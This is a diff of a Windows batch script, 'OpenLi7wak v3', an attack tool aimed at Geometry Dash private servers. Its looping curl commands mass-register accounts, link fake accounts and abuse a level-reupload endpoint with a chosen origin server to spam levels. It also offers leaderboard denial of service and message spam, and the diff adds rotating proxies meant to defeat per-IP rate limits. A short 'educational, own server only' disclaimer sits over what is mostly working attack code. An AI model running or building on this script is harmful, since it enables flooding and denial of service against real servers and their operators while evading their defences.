@@ -1,12 +1,11 @@
 @echo off
 setlocal enabledelayedexpansion
+chcp 65001 >NUL
+title OpenLi7wak v3 ^|^| Νεκροι χωρις ενημερωση
 set state=start
 if NOT exist "%localappdata%\OpenLi7wak" (
 md "%localappdata%\OpenLi7wak"
 ) 
-if exist "%localappdata%\OpenLi7wak\proxy.txt" (
-set /p proxied=<%localappdata%\OpenLi7wak\proxy.txt
-)
 if exist "%localappdata%\OpenLi7wak\encode.exe" (
   set FileName="%localappdata%\OpenLi7wak\encode.exe"
 ) else (
@@ -21,25 +20,27 @@ cls
 :::  | |__| | |_) |  __/ | | | |____| | / /  \ V  V / (_| |   < 
 :::   \____/| .__/ \___|_| |_|______|_|/_/    \_/\_/ \__,_|_|\_\
 :::         | |                                                 
-:::         |_|     
+:::         |_|     #ripindex
 for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A             
 echo.          
+echo THIS TOOL HAS BEEN DISCONTINUED AND SO UNTESTED
 echo For EDUCATIONAL purpose! ONLY on your OWN GDPS
 echo GDPS Owner may publicly disclose your IP address if the tool is used without EXPLICIT CONSENT
 goto %state%                                                                                  
 :start
 echo --- CHOOSE OPTION ---
-echo [1] Reupload SPAM
-echo [2] Reupload SPAM [Legacy]
+echo [1] Reupload SPAM [4Hop]
+echo [2] Reupload SPAM [1Hop]
 echo [3] Leaderboard DoS
 echo [4] Message SPAM
 echo --- PROXY OPTIONS ---
 echo [5] Add proxy
 echo [6] Test proxy
 echo [7] Delete proxy settings
+echo [8] Open in notepad
 echo --- OTHER OPTIONS ---
-echo [8] Credits ^& Legal
-echo [9] Exit
+echo [9] Credits ^& Legal
+echo [0] Exit
 set /p op=
 if %op%==1 set state=rl
 if %op%==2 set state=ru
@@ -47,9 +48,10 @@ if %op%==3 set state=ls
 if %op%==4 set state=ms
 if %op%==5 set state=px
 if %op%==6 set state=tp
-if %op%==7 del %localappdata%\OpenLi7wak\proxy.txt
-if %op%==8 set state=cr
-if %op%==9 exit
+if %op%==7 del %localappdata%\OpenLi7wak\proxy.txt & set "proxied="
+if %op%==8 start /W notepad %localappdata%\OpenLi7wak\proxy.txt
+if %op%==9 set state=cr
+if %op%==0 exit
 goto cl
 :cr
 set state=start
@@ -64,7 +66,10 @@ start http://www.gnu.org/licenses/gpl-3.0.en.html
 goto cl
 :tp
 set state=start
-set test="curl %proxied% -s https://api64.ipify.org/"
+set p=tp1
+goto get
+:tp1
+set test="curl %proxied% -s http://api64.ipify.org/"
 for /f "usebackq delims=" %%a in (`!test!`) do (
   echo Your IP is: %%a
 )
@@ -73,18 +78,27 @@ goto cl
 :px
 set state=start
 echo.
-echo You can use a (rotating) proxy with OpenLi7wak to prove to zSpunky that adding a timeout per ip is a skill issue
-echo You can get one at webshare.io (not affiliated), though may be slow...
+echo You can use a (rotating) proxy with OpenLi7wak because just adding a timeout per ip is a skill issue
+echo You can later come back at this option and add another one! Proxies will be picked randomly
 echo.
+set /p ptp=Proxy type (http://, socks4://, etc... ): 
 set /p pra=Proxy address: 
+echo Does the proxy require authentication?
+set /p pau=[y/n]
+if %pau%==N set noauth=1
+if %pau%==n set noauth=1
+if %noauth%==1 goto nauth
 set /p pru=Proxy username: 
 set /p prp=Proxy password: 
+:nauth
 set /p pro=Proxy PORT: 
 echo.
 echo Are the following values correct?
 echo Proxy address: %pra%
+if %noauth% neq 1 (
 echo Proxy username: %pru%
 echo Proxy password: %prp%
+)
 echo Proxy PORT: %pro%
 echo.
 echo [y]es / [N]o
@@ -93,7 +107,11 @@ if %conf2%==y goto pset
 if %conf2%==Y goto pset
 goto px
 :pset
-echo --proxy "http://%pru%:%prp%@%pra%:%pro%" > %localappdata%\OpenLi7wak\proxy.txt
+if %noauth%==1 (
+echo --proxy "%ptp%%pra%:%pro%" >> %localappdata%\OpenLi7wak\proxy.txt
+goto cl
+)
+echo --proxy "%ptp%%pru%:%prp%@%pra%:%pro%" >> %localappdata%\OpenLi7wak\proxy.txt
 goto cl
 :ms
 set state=start
@@ -103,6 +121,9 @@ set /p pass=Please give a password to be used:
 for /f "delims=" %%a in ('%FileName% %pass%') do set "password=%%a"
 echo Running... Sit tight...
 :s
+set p=s1
+goto get
+:s1
 set /a nb+=1 > nul
 set username=Li7wak %random%%random%
 curl %proxied% %host%/tools/account/registerAccount.php -X POST -d "username=%username%&password=%pass%&proxy=1&repeatpassword=%pass%&email=a@a.a&repeatemail=a@a.a" > nul
@@ -122,6 +143,9 @@ goto :s
 goto cl
 
 :ls
+set p=ls1
+goto get
+:ls1
 set state=start
 set /p host=Host (https://gdps.com/database): 
 set /p pass=Please give a password to be used: 
@@ -144,7 +168,8 @@ echo Ran
 goto :q
 goto cl
 :ru
-echo You will provide the following info: Bug URL (gdps containing the bug code)
+echo Using [1Hop Exploit]
+echo You will provide the following info: Bug host (https://server.com)
 echo and the target GDPS to spam (eg https://anygdps.com/database)
 echo.
 set /p origin=Enter the bug GDPS url (full path): 
@@ -160,43 +185,63 @@ if %conf1%==Y goto a
 set state=ru
 goto cl
 :a
-curl %proxied% -X POST -d "levelid=%random%&server=%origin%&proxy=1&debug=0" %target%/tools/levelReupload.php
+set p=a1
+goto get
+:a1
+curl %proxied% -X POST -d "levelid=%random%&server=%origin%/level/%random%/%random%&proxy=1&debug=0" %target%/tools/levelReupload.php
 goto :a
 set state=start
 goto cl
 
 :rl
+echo Using [4Hop Exploit]
+echo Proxies are required in order to pass the exploit
 echo You will provide the following info: Bug host (https://server.com)
 echo and the target GDPS to spam (eg https://anygdps.com/database)
 echo.
 set /p origin=Enter the bug GDPS url (full path): 
 set /p target=Enter the GDPS url: 
 set /p pass=Please give a password to be used: 
+set /p noactivate=Does the account need to be activated ? (y/N)
 echo Are the following information correct?
 echo.
 echo Origin: %origin%
 echo Target: %target%
-echo Password: %password%
+echo Password: %pass%
+echo NeedToActivate: %nocativate% (if yes, exploit can only be ran once)
 echo [y]es / [N]o
 set /p confv1=
-if %confv1%==y goto a
-if %confv1%==Y goto a
+if %confv1%==y goto aa
+if %confv1%==Y goto aa
 set state=rl
 goto cl
-:a
-set rand=%random%%random%
+:aa
+set p=aa1
+goto get
+:aa1
 set username=Li7wak %random%%random%
 echo.
 curl %proxied% "%target%/tools/account/registerAccount.php" -X POST -d "username=%username%&password=%pass%&proxy=1&repeatpassword=%pass%&email=a@a.a&repeatemail=a@a.a" > nul
+echo Registered an account!
 echo.
+if %noactivate%==n goto bb
+if %noactivate%==N goto bb
+echo Your username is %username% and your password is %pass%
+echo.
+start http://%target%/tools/account/activateAccount.php
+pause
+:bb
 curl %proxied% "%target%/accounts/loginGJAccount.php" -X POST -d "udid=%random%&userName=%username%&password=%pass%&secret=Wmfv3899gc9" > nul
+echo Logged in!
 echo.
 curl %proxied% "%target%/tools/linkAcc.php" -X POST -d "userhere=%username%&passhere=%pass%&usertarg=%username%&passtarg=%pass%&server=%origin%&server_path=/login/%rand%&debug=0" > nul
+echo Linked a fake account!
 echo.
+set rand=%random%%random%
 curl %proxied% "%target%/tools/levelReupload.php" -X POST -d "levelid=%rand%&server=%origin%&server_path=/level/%rand%/%rand%&debug=0&user=%username%&pass=%pass%" > nul
 echo.
 echo RAN
-goto :a
+goto :aa
 set state=start
 goto cl
 
@@ -218,5 +263,17 @@ goto cl
 curl https://github.com/masckmaster2007/OpenLi7wak/releases/download/v1/encode.exe --output "%localappdata%\OpenLi7wak\encode.exe" -L
 set FileName=%localappdata%\OpenLi7wak\encode.exe
 goto cl
+
+:get
+if NOT exist "%localappdata%\OpenLi7wak\proxy.txt" (
+set "proxied="
+goto %p%
+)
+set "txtFile=%localappdata%\OpenLi7wak\proxy.txt"
+set "proxied="
+for /f %%C in ('type "%txtFile%" ^| find /c /v ""') do set "lineCount=%%C"
+set /a "randomLine=(%random% %% %lineCount%) + 1"
+for /f "tokens=1* delims=:" %%L in ('findstr /n "^" "%txtFile%" ^| findstr "^%randomLine%:"') do set "proxied=%%M"
+goto %p%
 endlocal
 pause>nul
